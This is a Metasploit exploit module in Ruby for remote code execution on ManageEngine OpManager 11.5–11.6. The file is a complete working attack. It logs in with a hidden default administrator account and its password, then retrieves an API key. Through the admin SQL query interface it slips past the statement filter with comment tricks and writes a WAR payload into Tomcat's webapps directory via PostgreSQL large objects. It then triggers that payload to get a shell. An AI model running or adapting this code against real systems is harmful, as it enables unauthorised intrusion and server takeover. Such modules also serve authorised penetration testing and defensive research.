##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  # It removes large object in database, shoudn't be a problem, but just in case....
  Rank = ManualRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'ManageEngine OpManager Remote Code Execution',
      'Description'    => %q{
        This module exploits a default credential vulnerability in ManageEngine OpManager, where a
        default hidden account "IntegrationUser" with administrator privileges exists. The account
        has a default password of "plugin" which can not be reset through the user interface. By
        log-in and abusing the default administrator's SQL query functionality, it's possible to
        write a WAR payload to disk and trigger an automatic deployment of this payload. This
        module has been tested successfully on OpManager v11.5 and v11.6 for Windows.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'xistence <xistence[at]0x90.nl>' # Discovery, Metasploit module
        ],
      'References'     =>
        [
          [ 'EDB', '38174' ],
        ],
      'Platform'       => ['java'],
      'Arch'           => ARCH_JAVA,
      'Targets'        =>
        [
          ['ManageEngine OpManager v11.6', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Sep 14 2015',
      'DefaultTarget'  => 0))
  end

  def uri
    target_uri.path
  end

  def check
    # Check version
    vprint_status("#{peer} - Trying to detect ManageEngine OpManager")

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(uri, 'LoginPage.do')
    })

    unless res && res.code == 200
      return Exploit::CheckCode::Safe
    end

    if res.body =~ /OpManager.*v\.([0-9]+\.[0-9]+)<\/span>/
      version = $1
      if Gem::Version.new(version) <= Gem::Version.new('11.6')
        return Exploit::CheckCode::Appears
      else
        # Patch unknown
        return Exploit::CheckCode::Detected
      end
    elsif res.body =~ /OpManager/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end

  def sql_query( key, query )
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, 'api', 'json', 'admin', 'SubmitQuery'),
      'vars_get' => { 'apiKey' => key },
      'vars_post'   => { 'query' => query }
    })

    unless res && res.code == 200
      fail_with(Failure::Unknown, "#{peer} - Query was not succesful!")
    end

    res
  end

  def exploit
    print_status("#{peer} - Access login page")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => normalize_uri(uri, 'jsp', 'Login.do'),
      'vars_post' => {
        'domainName' => 'NULL',
        'authType' => 'localUserLogin',
        'userName' => 'IntegrationUser', # Hidden user
        'password' => 'plugin' # Password of hidden user
      }
    })

    if res && res.code == 302
      redirect =  URI(res.headers['Location']).to_s.gsub(/#\//, "")
      print_status("#{peer} - Location is [ #{redirect} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Access to login page failed!")
    end


    # Follow redirection process
    print_status("#{peer} - Following redirection")
    res = send_request_cgi({
      'uri' => redirect,
      'method' => 'GET'
    })

    if res && res.code == 200 && res.body =~ /window.OPM.apiKey = "([a-z0-9]+)"/
      api_key = $1
      print_status("#{peer} - Retrieved API key [ #{api_key} ]")
    else
      fail_with(Failure::Unknown, "#{peer} - Redirect failed!")
    end

    app_base = rand_text_alphanumeric(4 + rand(32 - 4))
    war_payload = payload.encoded_war({ :app_name => app_base }).to_s
    war_payload_base64 = Rex::Text.encode_base64(war_payload).gsub(/\n/, '')

    print_status("#{peer} - Executing SQL queries")

    # Remove large object in database, just in case it exists from previous exploit attempts
    sql = 'SELECT lo_unlink(-1)'
    sql_query(api_key, sql)

    # Create large object "-1". We use "-1" so we will not accidently overwrite large objects in use by other tasks.
    sql = 'SELECT lo_create(-1)'
    result = sql_query(api_key, sql)
    if result.body =~ /lo_create":([0-9]+)}/
      lo_id = $1
    else
      fail_with(Failure::Unknown, "#{peer} - Postgres Large Object ID not found!")
    end

    # Insert WAR payload into the pg_largeobject table. We have to use /**/ to bypass OpManager'sa checks for INSERT/UPDATE/DELETE, etc.
    sql = "INSERT/**/INTO pg_largeobject (loid,pageno,data) VALUES(#{lo_id}, 0, DECODE('#{war_payload_base64}', 'base64'))"
    sql_query(api_key, sql)

    # Export our large object id data into a WAR file
    sql = "SELECT lo_export(#{lo_id}, '..//..//tomcat//webapps//#{app_base}.war');"
    sql_query(api_key, sql)

    # Remove our large object in the database
    sql = 'SELECT lo_unlink(-1)'
    sql_query(api_key, sql)

    register_file_for_cleanup("tomcat//webapps//#{app_base}.war")
    register_file_for_cleanup("tomcat//webapps//#{app_base}")

    10.times do
      select(nil, nil, nil, 2)

      # Now make a request to trigger the newly deployed war
      print_status("#{peer} - Attempting to launch payload in deployed WAR...")
      res = send_request_cgi(
        {
          'uri'    => normalize_uri(target_uri.path, app_base, "#{Rex::Text.rand_text_alpha(rand(8) + 8)}.jsp"),
          'method' => 'GET'
        })


      # Failure. The request timed out or the server went away.
      break if res.nil?
      # Success! Triggered the payload, should have a shell incoming
      break if res.code == 200
    end

  end

end
